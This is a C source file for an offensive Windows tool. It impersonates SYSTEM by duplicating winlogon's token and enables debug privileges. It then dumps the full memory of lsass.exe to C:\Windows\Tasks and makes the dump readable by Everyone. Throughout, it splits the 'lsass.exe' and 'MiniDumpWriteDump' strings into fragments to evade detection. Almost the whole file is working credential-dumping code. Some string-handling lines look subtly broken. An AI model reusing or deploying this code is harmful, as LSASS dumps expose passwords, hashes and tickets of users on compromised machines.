/*

    Author: vari.sh

    Description: This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Windows\Tasks

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <aclapi.h> 


// Logs
FILE* logFile;

// Define the function pointer type for MiniDumpWriteDump
typedef BOOL(WINAPI* PFN_MiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

// Loads a clean copy of dbghelp.dll from the system directory
HMODULE LoadCleanDbghelp()
{
    char dllPath[] = "C:\\Windows\\System32\\dbghelp.dll";

    HMODULE hDbghelp = LoadLibraryA(dllPath);
    if (hDbghelp)
    {
        fprintf(logFile, "Loaded clean copy of dbghelp.dll at: %p\n", hDbghelp);
    }
    else
    {
        fprintf(logFile, "Failed to load dbghelp.dll. Error: %lu\n", GetLastError());
    }

    return hDbghelp;
}

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logFile, "CreateToolhelp32Snapshot error: %u\n", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (Process32First(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            fprintf(logFile, "[+] Successfully duplicated token. Process can now run as SYSTEM.\n");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logFile, "Failed to obtain system token\n");
        return FALSE;
    }
    return TRUE;
}

// print privileges
BOOL PrintTokenPrivileges(HANDLE hToken) {
    DWORD dwSize = 0;
    // Prima chiamata per ottenere la dimensione necessaria
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("GetTokenInformation failed to get buffer size, error: %lu\n", GetLastError());
        return FALSE;
    }

    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (!pTokenPrivileges) {
        printf("Memory allocation failed.\n");
        return FALSE;
    }

    // Chiamata per ottenere le informazioni sui privilegi
    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        printf("GetTokenInformation failed, error: %lu\n", GetLastError());
        free(pTokenPrivileges);
        return FALSE;
    }

    printf("Token has %lu privilege(s):\n", pTokenPrivileges->PrivilegeCount);

    // Per ogni privilegio, otteniamo il nome leggibile
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        LUID_AND_ATTRIBUTES laa = pTokenPrivileges->Privileges[i];
        char privilegeName[256] = { 0 };
        DWORD cchName = sizeof(privilegeName);
        if (LookupPrivilegeNameA(NULL, &laa.Luid, privilegeName, &cchName)) {
            printf("  %s - Attributes: 0x%lx\n", privilegeName, laa.Attributes);
        }
        else {
            printf("  (Unable to lookup privilege name, error: %lu)\n", GetLastError());
        }
    }

    free(pTokenPrivileges);
    return TRUE;
}

int main(void)
{
    // Logs
    logFile = fopen("C:\\Windows\\Tasks\\log.txt", "a");

    // Enabling SeDebugPrivilege
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL bResult;

    // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Duplicazione del token di SYSTEM
    HANDLE hSystemToken = NULL;
    if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
        fprintf(logFile, "[!] Failed to duplicate SYSTEM token.\n");
        return 1;
    }
    fprintf(logFile, "[+] Successfully duplicated SYSTEM token.\n");

    // Abilitazione dei privilegi sul token SYSTEM
    struct _MY_TOKEN_PRIVILEGES {
        DWORD PrivilegeCount;
        LUID_AND_ATTRIBUTES Privileges[4];
    } tp2;

    if (LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &tp2.Privileges[0].Luid) &&
        LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &tp2.Privileges[1].Luid) &&
        LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &tp2.Privileges[2].Luid) &&
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp2.Privileges[3].Luid)) {
        tp2.PrivilegeCount = 4;
        tp2.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        tp2.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
        tp2.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
        tp2.Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hSystemToken, FALSE, (PTOKEN_PRIVILEGES)&tp2, sizeof(tp2), NULL, NULL)) {
            fprintf(logFile, "[!] AdjustTokenPrivileges on SYSTEM token failed, error: %lu\n", GetLastError());
        }
        else {
            fprintf(logFile, "[+] Additional privileges enabled on the SYSTEM token.\n");
        }
    }
    else {
        fprintf(logFile, "[!] LookupPrivilegeValue for additional privileges failed, error: %lu\n", GetLastError());
    }

    // Impersona il token SYSTEM
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        fprintf(logFile, "[!] ImpersonateLoggedOnUser failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logFile, "[+] Impersonation succeeded.\n");
    }

    if (!SetThreadToken(NULL, hSystemToken)) {
        fprintf(logFile, "[!] SetThreadToken failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logFile, "[+] SetThreadToken succeeded. Current thread now uses SYSTEM token.\n");
    }

    // Load the DLLs kernel32.dll and ntdll.dll
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        fprintf(logFile, "Error loading kernel32.dll\n");
        return 1;
    }
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        fprintf(logFile, "Error loading ntdll.dll\n");
        return 1;
    }

    // Build the target process name: "lsass.exe"
    wchar_t part1[] = L"ls";
    wchar_t part2[] = L"ass";
    wchar_t part3[] = L".ex";
    wchar_t part4[] = L"e";
    char targetProcessName[50] = { 0 };
    swprintf(targetProcessName, "%s%s%s%s", part1, part2, part3, part4);

    DWORD targetPID = 0;

    // Create a snapshot of active processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        fprintf(logFile, "Unable to create process snapshot.\n");
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, targetProcessName) == 0)
            {
                targetPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (targetPID == 0)
    {
        fprintf(logFile, "Target process not found.\n");
        return 1;
    }

    // Open the target process with full access (requires elevation)
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_ALL_ACCESS | PROCESS_VM_WRITE, FALSE, targetPID);
    if (!hProcess)
    {
        fprintf(logFile, "Unable to open target process (PID: %lu).\n", targetPID);
        return 1;
    }

    // Define the dump file path
    const char* dumpFilePath = "C:\\Windows\\tasks\\ssasl.dmp";

    // Create the dump file
    HANDLE hFile = CreateFileA(dumpFilePath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        fprintf(logFile, "Unable to create dump file.\n");
        CloseHandle(hProcess);
        return 1;
    }

    HMODULE hDbghelp = LoadCleanDbghelp();
    if (!hDbghelp)
    {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Build the function name: "MiniDumpWriteDump"
    char mdPart1[] = "Mini";
    char mdPart2[] = "Dump";
    char mdPart3[] = "Write";
    char mdPart4[] = "Dump";
    char miniFuncName[100] = { 0 };
    sprintf(miniFuncName, "%s%s%s%s", mdPart1, mdPart2, mdPart3, mdPart4);

    PFN_MiniDumpWriteDump pMiniDumpWriteDump = (PFN_MiniDumpWriteDump)GetProcAddress(hDbghelp, miniFuncName);
    if (!pMiniDumpWriteDump)
    {
        fprintf(logFile, "Unable to retrieve MiniDumpWriteDump address.\n");
        FreeLibrary(hDbghelp);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Dump the target process
    BOOL dumped = pMiniDumpWriteDump(
        hProcess,               // Handle to target process
        targetPID,              // Process ID
        hFile,                  // Handle to dump file
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception parameter
        NULL,                   // User stream parameter
        NULL                    // Callback parameter
    );

    if (dumped)
    {
        fprintf(logFile, "Dump completed.\n");
    }
    else
    {
        fprintf(logFile, "Dump failed. Error code: %lu\n", GetLastError());
    }

    // Clean up resources before modifying file permissions
    FreeLibrary(hDbghelp);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    // Set file permissions to grant GENERIC_READ to Everyone
    DWORD dwRes;
    EXPLICIT_ACCESS ea;
    PACL pNewDACL = NULL;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        fprintf(logFile, "Failed to set entries in ACL. Error: %lu\n", dwRes);
    }
    else
    {
        dwRes = SetNamedSecurityInfoA(
            (LPSTR)dumpFilePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            pNewDACL,
            NULL);
        if (dwRes != ERROR_SUCCESS)
        {
            fprintf(logFile, "Failed to set security info. Error: %lu\n", dwRes);
        }
    }
    if (pNewDACL)
        LocalFree(pNewDACL);

    fclose(logFile);

    return 0;
}
